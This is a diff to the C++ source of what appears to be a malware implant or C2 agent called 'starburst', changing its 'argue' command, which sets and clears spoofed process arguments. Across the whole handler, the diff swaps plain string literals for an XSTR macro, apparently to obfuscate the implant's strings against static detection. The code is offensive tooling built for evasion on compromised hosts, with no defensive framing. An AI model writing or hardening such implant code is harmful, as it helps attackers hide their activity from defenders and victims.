@@ -20,14 +20,14 @@ auto declfn starburst::cmd_argue(
 
     if ( !action_str || action_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no action provided" ) ) );
+            XSTR( "no action provided" ) );
         return;
     }
 
     char action_buf[16] = { 0 };
     memory::copy( action_buf, action_str, action_len < 15 ? action_len : 15 );
 
-    if ( str_cmp( action_buf, symbol<char*>( const_cast<char*>( "clear" ) ) ) == 0 ) {
+    if ( str_cmp( action_buf, XSTR( "clear" ) ) == 0 ) {
         if ( inst.argue_args ) {
             inst.heap_free( inst.argue_args );
             inst.argue_args = nullptr;
@@ -35,17 +35,17 @@ auto declfn starburst::cmd_argue(
         inst.argue_len = 0;
 
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "Argument spoofing cleared" ) ) );
+            XSTR( "Argument spoofing cleared" ) );
         return;
     }
 
-    if ( str_cmp( action_buf, symbol<char*>( const_cast<char*>( "set" ) ) ) == 0 ) {
+    if ( str_cmp( action_buf, XSTR( "set" ) ) == 0 ) {
         uint32_t args_len = 0;
         auto args_str = parser_string( params, &args_len );
 
         if ( !args_str || args_len == 0 ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "no fake args provided" ) ) );
+                XSTR( "no fake args provided" ) );
             return;
         }
 
@@ -59,7 +59,7 @@ auto declfn starburst::cmd_argue(
         if ( !inst.argue_args ) {
             inst.argue_len = 0;
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+                XSTR( "alloc failed" ) );
             return;
         }
 
@@ -73,11 +73,11 @@ auto declfn starburst::cmd_argue(
         auto output = static_cast<char*>( inst.heap_alloc( out_len ) );
         if ( !output ) {
             queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-                symbol<char*>( const_cast<char*>( "Argument spoofing set" ) ) );
+                XSTR( "Argument spoofing set" ) );
             return;
         }
 
-        str_copy( output, symbol<char*>( const_cast<char*>( "Argument spoofing set: " ) ) );
+        str_copy( output, XSTR( "Argument spoofing set: " ) );
         uint32_t off = str_len( output );
         memory::copy( output + off, inst.argue_args, args_len );
         output[off + args_len] = '\0';
@@ -88,7 +88,7 @@ auto declfn starburst::cmd_argue(
     }
 
     queue_response( inst, task_uuid, RESPONSE_ERROR,
-        symbol<char*>( const_cast<char*>( "unknown action: use set or clear" ) ) );
+        XSTR( "unknown action: use set or clear" ) );
 }
 
 #endif
